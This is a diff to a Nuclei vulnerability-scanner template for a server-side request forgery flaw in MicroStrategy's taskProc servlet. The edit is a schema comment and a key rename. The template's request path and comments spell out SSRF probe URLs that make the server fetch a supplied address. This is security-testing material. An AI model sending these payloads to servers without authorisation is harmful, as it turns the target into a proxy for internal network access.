@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: microstrategy-ssrf
 info:
   name: MicroStrategy tinyurl SSRF
@@ -7,7 +8,7 @@ info:
   # blind ssrf
   # /servlet/taskProc?taskId=wikiScrapper&taskEnv=xml&taskContentType=xml&searchString=https://SSRF&shouldSuggest=false&publicDataSuggestionURL=&publicDataSearchURL=&publicDataPageURL=
   # /servlet/taskProc?taskId=validateUsherConfigTask&taskEnv=xml&taskContentType=xml&serverURL=https://SSRF
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com'
